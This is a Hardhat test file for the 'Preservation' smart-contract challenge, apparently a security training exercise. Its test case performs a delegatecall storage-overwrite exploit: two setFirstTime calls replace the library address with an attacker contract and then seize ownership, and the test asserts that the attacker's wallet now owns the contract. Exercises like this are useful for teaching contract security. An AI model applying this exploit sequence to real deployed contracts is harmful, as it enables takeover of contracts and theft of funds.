const {
    time,
    loadFixture,
} = require("@nomicfoundation/hardhat-network-helpers");
const { anyValue } = require("@nomicfoundation/hardhat-chai-matchers/withArgs");
const { expect } = require("chai");
const { ethers } = require("hardhat");

const NAME = "Preservation";

describe(NAME, function () {
    async function setup() {
        const [owner, attackerWallet] = await ethers.getSigners();

        const LibFactory = await ethers.getContractFactory("LibraryContract");
        const lib1Contract = await LibFactory.deploy();
        const lib2Contract = await LibFactory.deploy();

        const PreservationFactory = await ethers.getContractFactory("Preservation");
        const preservationContract = await PreservationFactory.deploy(lib1Contract.address, lib2Contract.address);

        return { owner, preservationContract, attackerWallet };
    }

    // delegatecall will use proxy storage memory not implementation contract
    describe("exploit", async function () {
        let owner, preservationContract, attackerWallet, attackerContract;
        before(async function () {
            ({ owner, preservationContract, attackerWallet } = await loadFixture(setup));
        })

        it("conduct your attack here", async function () {
            const AttackerFactory = await ethers.getContractFactory("preservationHack");
            attackerContract = await AttackerFactory.connect(attackerWallet).deploy();

            //overwrite first slot (timeZone1Library) with attackerContract.address
            await preservationContract.connect(attackerWallet).setFirstTime(attackerContract.address);
            //call attackerContract to set new owner
            await preservationContract.connect(attackerWallet).setFirstTime(0);
        });

        after(async function () {
            expect(await preservationContract.owner.call()).to.be.equal(attackerWallet.address);
        });
    });
});